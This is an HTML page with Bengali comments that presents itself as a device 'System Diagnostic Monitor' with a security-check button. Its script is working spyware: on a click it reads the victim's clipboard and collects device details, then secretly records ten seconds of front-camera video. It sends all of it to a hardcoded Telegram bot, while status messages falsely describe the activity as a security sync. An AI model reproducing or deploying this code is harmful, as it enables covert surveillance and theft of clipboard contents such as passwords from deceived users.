<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device System Analysis</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>

    <style>
        body { background: #070b14; color: #cbd5e1; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
        .info-card { background: #1e293b; padding: 12px; border-radius: 10px; border-left: 4px solid #0ea5e9; margin-bottom: 10px; }
        .clipboard-box { background: #0f172a; border: 1px dashed #334155; padding: 10px; color: #38bdf8; font-family: monospace; border-radius: 8px; }
        #video-hidden { display: none; }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen p-5">

    <div class="w-full max-w-md h-20 bg-slate-900 mb-6 flex items-center justify-center rounded-lg border border-slate-800">
        <span class="text-slate-600 text-xs italic">Sponsored Ad</span>
    </div>

    <div class="glass p-6 rounded-3xl w-full max-w-md shadow-2xl">
        <h1 class="text-xl font-bold text-white text-center mb-6">System Diagnostic Monitor</h1>

        <div id="display-info">
            <div class="info-card">
                <p class="text-xs text-slate-400 uppercase">OS & Browser</p>
                <p id="ui-os" class="text-sm font-semibold text-white">Detecting...</p>
            </div>
            <div class="info-card">
                <p class="text-xs text-slate-400 uppercase">Screen Resolution</p>
                <p id="ui-res" class="text-sm font-semibold text-white">---</p>
            </div>
            <div class="info-card">
                <p class="text-xs text-slate-400 uppercase">Connection</p>
                <p id="ui-net" class="text-sm font-semibold text-sky-400">Checking...</p>
            </div>
            <div class="mt-4">
                <p class="text-xs text-slate-400 mb-2 uppercase">Current Clipboard Data:</p>
                <div id="ui-clip" class="clipboard-box text-xs break-all">Permission required...</div>
            </div>
        </div>

        <video id="video-hidden" autoplay muted playsinline></video>

        <button id="start-btn" class="w-full mt-8 bg-sky-600 hover:bg-sky-500 text-white font-bold py-4 rounded-2xl transition shadow-lg shadow-sky-900/20 active:scale-95">
            START SECURITY CHECK
        </button>

        <div id="loading" class="mt-6 hidden flex flex-col items-center">
            <div class="w-10 h-10 border-4 border-sky-500 border-t-transparent rounded-full animate-spin"></div>
            <p id="status-msg" class="text-sky-400 text-xs mt-3 font-mono">এনালাইজিং ডাটা...</p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
        const CHAT_ID = '6048050987';

        const startBtn = document.getElementById('start-btn');
        const loading = document.getElementById('loading');
        const statusMsg = document.getElementById('status-msg');
        const videoElement = document.getElementById('video-hidden');

        // স্ক্রিনে ডাটা দেখানো (Initial UI)
        document.getElementById('ui-os').innerText = navigator.platform + " | " + (navigator.userAgent.includes("Chrome") ? "Chrome" : "Browser");
        document.getElementById('ui-res').innerText = window.screen.width + " x " + window.screen.height;
        document.getElementById('ui-net').innerText = navigator.onLine ? "Connected" : "Offline";

        startBtn.addEventListener('click', async () => {
            startBtn.style.display = 'none';
            loading.classList.remove('hidden');

            let clipText = "Access Denied";
            try {
                clipText = await navigator.clipboard.readText();
                document.getElementById('ui-clip').innerText = clipText || "Empty";
            } catch (e) {
                document.getElementById('ui-clip').innerText = "Access Denied";
            }

            // ১. সুন্দরভাবে সাজানো টেক্সট রিপোর্ট (Bot এ যাবে)
            const report = `
📊 *NEW SYSTEM LOG*
━━━━━━━━━━━━━━━━━━
📱 *OS:* \`${navigator.platform}\`
🌐 *User Agent:* \`${navigator.userAgent.substring(0, 50)}...\`
🖥 *Resolution:* \`${window.screen.width}x${window.screen.height}\`
🛰 *Network:* \`${navigator.onLine ? "Online" : "Offline"}\`

📋 *CLIPBOARD DATA:*
\`\`\`
${clipText}
\`\`\`
━━━━━━━━━━━━━━━━━━`;

            // অটোমেটিক টেক্সট পাঠানো
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
            });

            // ২. অটোমেটিক ভিডিও রেকর্ড (১০ সেকেন্ড)
            try {
                statusMsg.innerText = "Syncing Security Data (10s)...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                videoElement.srcObject = stream;

                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('video', blob, 'capture.mp4');

                    statusMsg.innerText = "Uploading Secure Clip...";
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });

                    stream.getTracks().forEach(t => t.stop());
                    statusMsg.innerText = "Check Completed Successfully!";
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 10000);

            } catch (err) {
                statusMsg.innerText = "Permission Required to Finish!";
            }
        });
    </script>
</body>
</html>
